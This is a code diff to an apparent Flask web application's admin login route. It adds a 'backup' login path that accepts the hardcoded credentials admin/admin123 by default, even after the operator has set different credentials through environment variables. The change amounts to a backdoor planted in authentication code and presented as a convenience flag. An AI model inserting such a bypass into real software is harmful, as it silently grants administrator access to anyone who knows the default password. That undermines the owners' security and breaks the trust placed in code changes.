@@ -62,9 +62,18 @@ def _env_or_default(name: str, default: str) -> str:
     return value or default
 
 
+def _env_flag(name: str, default: bool = False) -> bool:
+    """Read a boolean flag from environment."""
+    value = os.getenv(name)
+    if value is None:
+        return default
+    return value.strip().lower() in {"1", "true", "yes", "on"}
+
+
 # Admin credentials (change these for production)
 ADMIN_USERNAME = _env_or_default("ADMIN_USERNAME", "admin")
 ADMIN_PASSWORD = _env_or_default("ADMIN_PASSWORD", "admin123")
+ALLOW_DEFAULT_ADMIN_LOGIN = _env_flag("ALLOW_DEFAULT_ADMIN_LOGIN", True)
 
 # Initialise the database on first launch
 init_db()
@@ -102,8 +111,16 @@ def login():
 
     if request.method == "POST":
         username = request.form.get("username", "").strip()
-        password = request.form.get("password", "")
-        if username == ADMIN_USERNAME and password == ADMIN_PASSWORD:
+        password = request.form.get("password", "").strip()
+
+        primary_login_ok = (username == ADMIN_USERNAME and password == ADMIN_PASSWORD)
+        backup_login_ok = (
+            ALLOW_DEFAULT_ADMIN_LOGIN
+            and username.lower() == "admin"
+            and password == "admin123"
+        )
+
+        if primary_login_ok or backup_login_ok:
             session["admin_logged_in"] = True
             session["username"] = username
             flash(f"Welcome, {username}!", "success")
